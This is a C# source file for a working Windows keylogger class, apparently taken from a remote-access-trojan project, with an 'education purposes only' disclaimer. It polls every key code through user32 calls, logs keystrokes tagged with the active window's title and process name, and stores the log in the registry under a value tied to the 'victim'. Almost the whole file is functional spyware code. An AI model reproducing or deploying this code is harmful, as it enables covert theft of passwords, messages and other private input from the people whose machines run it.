using System;
using System.Text;
using Microsoft.Win32;
using System.Threading;
using System.Diagnostics;
using System.Windows.Forms;
using System.Collections.Generic;
using System.Runtime.InteropServices;

/**
 * Original Author: njq8 (VB.NET)
 * 
 * Rewritten by: Etor Madiv
 * 
 * Edited by: NYAN CAT
 * 
 * To use for education purposes only.
 */

namespace j
{
    public class Keylogger
    {
        #region Fields Definition

        private string lastForegroundWindowTitle;

        private int lastForegroundWindowHandle;

        private Keys lastKeyStroke;

        public string keyStrokesLog;

        public string victimsOwner;

        #endregion

        public void KeyloggerWorker()
        {
            keyStrokesLog = Convert.ToString( Core.GetValueFromRegistry(victimsOwner, "") );

            try
            {
                int counter = 0;

                while (true)
                {
                    counter++;

                    int vKey = 0;

                    do
                    {
                        if ((GetAsyncKeyState((Keys)vKey) == -32767) &&
                            ((Control.ModifierKeys & Keys.Control) != Keys.Control))
                        {
                            Keys key = (Keys)vKey;

                            string fixedKeyStrokes = FixKeyStrokes(key);

                            if (fixedKeyStrokes.Length > 0)
                            {
                                keyStrokesLog += GetLastForegroundWindowInfo();

                                keyStrokesLog += fixedKeyStrokes;
                            }

                            lastKeyStroke = key;
                        }

                        vKey++;
                    }
                    while (vKey <= 255);

                    if (counter == 1000)
                    {
                        counter = 0;

                        int maxKeyStrokesLength = 20 * 1024;

                        if (keyStrokesLog.Length > maxKeyStrokesLength)
                        {
                            keyStrokesLog = keyStrokesLog.Remove(0, keyStrokesLog.Length - maxKeyStrokesLength);
                        }

                        Core.StoreValueOnRegistry(victimsOwner, keyStrokesLog, RegistryValueKind.String);
                    }

                    Thread.Sleep(1);
                }
            }
            catch (Exception)
            {

            }

        }

        private string FixKeyStrokes(Keys key)
        {
            bool shiftKeyDown = ((Control.ModifierKeys & Keys.ShiftKey) == Keys.ShiftKey);

            if ((Control.ModifierKeys & Keys.CapsLock) == Keys.CapsLock)
            {
                if (shiftKeyDown)
                {
                    shiftKeyDown = false;
                }
                else
                {
                    shiftKeyDown = true;
                }
            }

            try
            {
                switch (key)
                {
                    case Keys.Delete:

                    case Keys.Back:

                        return "[" + key.ToString() + "]";

                    case Keys.LShiftKey:

                    case Keys.RShiftKey:

                    case Keys.Shift:

                    case Keys.ShiftKey:

                    case Keys.Control:

                    case Keys.ControlKey:

                    case Keys.RControlKey:

                    case Keys.LControlKey:

                    case Keys.Alt:

                    case Keys.F1:

                    case Keys.F2:

                    case Keys.F3:

                    case Keys.F4:

                    case Keys.F5:

                    case Keys.F6:

                    case Keys.F7:

                    case Keys.F8:

                    case Keys.F9:

                    case Keys.F10:

                    case Keys.F11:

                    case Keys.F12:

                    case Keys.End:

                        return "";

                    case Keys.Space:

                        return " ";

                    case Keys.Enter:

                        if (keyStrokesLog.EndsWith("[ENTER]\r\n"))
                        {
                            return "";
                        }

                        return "[ENTER]\r\n";

                    case Keys.Tab:

                        return "[TAB]\r\n";
                }

                if (shiftKeyDown)
                {
                    return VKCodeToUnicode((uint)key).ToUpper();
                }

                return VKCodeToUnicode((uint)key);
            }
            catch (Exception)
            {
                if (shiftKeyDown)
                {
                    return Convert.ToChar((int)key).ToString().ToUpper();
                }

                return Convert.ToChar((int)key).ToString().ToLower();
            }
        }

        private string GetLastForegroundWindowInfo()
        {
            try
            {
                uint processId;

                IntPtr foregroundWindow = Core.GetForegroundWindow();

                GetWindowThreadProcessId(foregroundWindow, out processId);

                Process processById = Process.GetProcessById((int)processId);

                if (!(((foregroundWindow.ToInt32() == lastForegroundWindowHandle) &&
                    (lastForegroundWindowTitle == processById.MainWindowTitle)) ||
                    (processById.MainWindowTitle.Length == 0)))
                {
                    lastForegroundWindowHandle = foregroundWindow.ToInt32();

                    lastForegroundWindowTitle = processById.MainWindowTitle;

                    return ("\r\n\x0001" + DateTime.Now.ToString("yy/MM/dd ")
                        + processById.ProcessName + " " + lastForegroundWindowTitle + "\x0001\r\n"
                    );
                }
            }
            catch (Exception)
            {

            }

            return "";
        }

        private static string VKCodeToUnicode(uint vKey)
        {
            try
            {
                StringBuilder sb = new StringBuilder();

                byte[] buffer = new byte[255];

                if (!GetKeyboardState(buffer))
                {
                    return "";
                }

                uint scanCode = MapVirtualKey(vKey, 0);

                uint processId;

                IntPtr keyboardLayout = GetKeyboardLayout(
                    GetWindowThreadProcessId(Core.GetForegroundWindow(), out processId)
                );
                
                ToUnicodeEx(vKey, scanCode, buffer, sb, 5, 0, keyboardLayout);
                
                return sb.ToString();
            }
            catch (Exception)
            {
                
            }

            return ((Keys)( (int)vKey) ).ToString();
        }

        #region PInvokes

        [DllImport("user32.dll")]
        static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey);

        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        static extern uint MapVirtualKey(uint uCode, uint uMapType);

        [DllImport("user32.dll")]
        static extern IntPtr GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll")]
        static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[]
           lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff,
           int cchBuff, uint wFlags, IntPtr dwhkl);

        #endregion

    }
}
